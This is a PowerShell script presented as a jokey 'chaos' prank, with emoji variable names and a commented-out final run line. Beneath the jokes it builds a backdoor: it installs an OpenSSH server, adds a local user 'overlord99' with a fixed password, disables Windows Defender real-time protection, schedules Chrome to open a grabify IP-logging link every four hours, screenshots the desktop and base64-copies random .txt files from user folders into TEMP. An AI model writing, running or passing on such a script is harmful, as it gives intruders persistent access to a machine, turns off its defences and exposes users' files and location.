# 🧙‍♂️ ELDRITCH SOUP.EXE – The Final Chaos Form 💀

$🐉 = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$🧠 = "-ExecutionPolicy Bypass -Command"
$🧪 = New-Object -ComObject WScript.Shell

function Invoke-CursedDelay {
    Start-Sleep -Seconds 4
}

# 1. Install SSH Capability
$🐍 = "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
Invoke-CursedDelay
$🧪.Arguments += "; $🐍"

# 2. Create Forbidden User
$👾 = "net user overlord99 K1ng0fCh@0s /add"
Invoke-CursedDelay
$🧪.Arguments += "; $👾"

# 3. Disable Windows Defender
$💤 = "Set-MpPreference -DisableRealtimeMonitoring $true"
Invoke-CursedDelay
$🧪.Arguments += "; $💤"

# 4. Schedule Chrome to open a weird website
$🌌 = "Register-ScheduledTask -TaskName 'PortalWatch' -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Application\chrome.exe' -Argument 'https://grabify.link/DHU0MR') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4))"
Invoke-CursedDelay
$🧪.Arguments += "; $🌌"

# 5. Launch Notepad as distraction
$📝 = "Start-Process notepad.exe"
Invoke-CursedDelay
$🧪.Arguments += "; $📝"

# 6. Create a mysterious TEMP folder
$🫠 = 'New-Item -Path "$env:TEMP\glorp_core" -ItemType Directory -Force'
Invoke-CursedDelay
$🧪.Arguments += "; $🫠"

# 7. Screenshot to future evidence folder
$📷 = '[Reflection.Assembly]::LoadWithPartialName("System.Drawing"); $b = New-Object Drawing.Bitmap 1920,1080; $g = [Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save("$env:TEMP\reality.png")'
Invoke-CursedDelay
$🧪.Arguments += "; $📷"

# 8. Base64 encode 3 random .txt files
Invoke-CursedDelay
$📁 = Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt -ErrorAction SilentlyContinue -Force | Get-Random -Count 3
foreach ($📄 in $📁) {
    try {
        $text = Get-Content $📄.FullName -Raw
        $hexed = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($text))
        $hexPath = "$env:TEMP\$(($📄.Name).Replace('.txt','_hexed.txt'))"
        $hexed | Out-File $hexPath -Force
        Invoke-CursedDelay
    } catch {}
}

# 9. Write dramatic event log
$📡 = "Write-EventLog -LogName Application -Source 'OracleOfChaos' -EntryType Information -EventId 777 -Message '✨ The simulation hiccupped ✨'"
Invoke-CursedDelay
$🧪.Arguments += "; $📡"

# 10. Roll a cursed dice
$🎲 = "Get-Random -Minimum 1 -Maximum 100"
Invoke-CursedDelay
$🧪.Arguments += "; $🎲"

# 11. Launch calculator for eldritch math
$🧿 = "Start-Process calc.exe"
Invoke-CursedDelay
$🧪.Arguments += "; $🧿"

# 12. Create alias for forbidden function
Invoke-CursedDelay
function Invoke-EldritchGlitch { "✨ Wiggle initiated ✨" }

# 13. Play random Windows sound
Invoke-CursedDelay
$🎼 = Get-ChildItem "$env:WINDIR\Media" -Filter *.wav | Get-Random
Start-Process $🎼.FullName -WindowStyle Hidden | Out-Null

# 14. Set desktop wallpaper if default image exists
Invoke-CursedDelay
$🖼️ = "$env:WINDIR\Web\Wallpaper\Windows\img0.jpg"
if (Test-Path $🖼️) {
    Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    [Wallpaper]::SystemParametersInfo(20, 0, $🖼️, 3)
}

# 15. Create shortcut to nothing
Invoke-CursedDelay
$🪢 = $🧪.CreateShortcut("$env:TEMP\cursed_link.lnk")
$🪢.TargetPath = "C:\Path\To\Nowhere.exe"
$🪢.Save()

# 16. Emit a cursed system beep
Invoke-CursedDelay
[console]::beep(888, 300)

# 17. Display toast from the beyond
Invoke-CursedDelay
$💌 = New-Object -ComObject WScript.Shell
$💌.Popup("💀 The simulation sneezed.", 2, "System Glitch Detected", 0x0)

# 18. Move mouse in a cursed circle
Invoke-CursedDelay
Add-Type -AssemblyName System.Windows.Forms
for ($i = 0; $i -lt 36; $i++) {
    $x = 500 + [math]::cos($i/5) * 50
    $y = 500 + [math]::sin($i/5) * 50
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
    Start-Sleep -Milliseconds 50
}

# 19. Dump registry key to nowhere
Invoke-CursedDelay
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" > $null

# 🚀 Run it all (optional — uncomment this line to actually run commands)
# & $🐉 $🧠 $🧪.Arguments
